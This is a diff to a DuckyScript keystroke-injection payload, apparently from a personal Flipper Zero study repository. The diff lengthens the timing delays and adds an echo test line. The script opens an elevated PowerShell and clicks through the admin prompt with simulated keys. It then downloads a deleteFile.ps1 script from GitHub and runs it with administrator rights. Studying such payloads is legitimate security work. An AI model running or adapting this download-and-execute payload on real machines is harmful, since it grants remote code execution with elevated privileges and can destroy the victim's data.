@@ -9,12 +9,15 @@ GUI r
 DELAY 200
 STRING powershell Start-Process powershell -Verb runAs
 ENTER
-DELAY 500
+DELAY 1500
 SHIFT TAB
-DELAY 200
+DELAY 1500
 ENTER
 DELAY 1500
 
 REM Downloading the deleteFile.ps1 from GitHub and running it
 STRING New-Object System.Net.WebClient | %{$_.DownloadFile('https://github.com/aenslei/flipperZero-studies/blob/main/Powershell/deleteFile.ps1', 'deleteFile.ps1'); Start-Process powershell.exe -Verb runAs -ArgumentList "-File deleteFile.ps1"}, exit
 ENTER
+
+REM Test Case
+STRING echo Script#6 Completed
